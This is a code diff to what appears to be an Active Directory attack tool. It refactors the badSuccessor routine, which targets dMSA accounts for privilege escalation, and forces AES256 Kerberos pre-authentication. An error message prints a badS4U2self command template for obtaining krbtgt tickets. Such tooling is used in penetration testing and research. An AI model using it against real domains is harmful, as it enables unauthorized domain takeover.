@@ -21,6 +21,27 @@ from kerbad.protocol.errors import KerberosError
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
 
 
+def _dmsa_kerberos_query(parsed):
+    """Build the kerbad query used to request a dMSA ticket."""
+    query_params = parse.parse_qs(parsed.query)
+    for param in ["serverip", "dc", "dcc", "realmc"]:
+        query_params.pop(param, None)
+
+    password_schemes = {
+        "kerberos+pass",
+        "kerberos+password",
+        "kerberos+pw",
+        "kerberos+pwb64",
+        "kerberos+pwhex",
+    }
+    if parsed.scheme.lower() in password_schemes:
+        # kerbad otherwise tries RC4 first and may retry it even after a
+        # modern KDC explicitly rejects RC4 pre-authentication.
+        query_params.setdefault("etype", [str(Enctype.AES256)])
+
+    return parse.urlencode(query_params, doseq=True)
+
+
 def _u2u_with_session_enctype(client):
     """Run kerbad U2U using the PKINIT session key's encryption type.
 
@@ -185,9 +206,7 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
     url = "kerberos+" + splitted_url[1]
 
     parsed = parse.urlparse(url)
-    query_params = parse.parse_qs(parsed.query)
-    for param in ['serverip', 'dc', 'dcc', 'realmc']:
-        query_params.pop(param, None)
+    kerberos_query = _dmsa_kerberos_query(parsed)
 
     host_params = {"ip": conn.conf.dcip}
     if ldap._serverinfo["dnsHostName"] not in compatible_dcs:
@@ -197,12 +216,12 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
         if not host_params:
             LOG.error("DC2025 not found, try to reach one of the list above manually:")
             new_netloc = parsed.netloc.split("@")[0] + '@<DC2025_IP>' if '@' in parsed.netloc else parsed.netloc
-            url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
+            url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=kerberos_query))
             LOG.error(f"badS4U2self '{url}' 'krbtgt/{ldap.domainname}@{ldap.domainname}' '{dmsa_sama}@{ldap.domainname}' --dmsa")
             return
 
     new_netloc = parsed.netloc.split("@")[0] + '@' + host_params["ip"] if '@' in parsed.netloc else parsed.netloc
-    url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
+    url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=kerberos_query))
 
     LOG.debug(f"Using kerbad url: {url}")
     try:
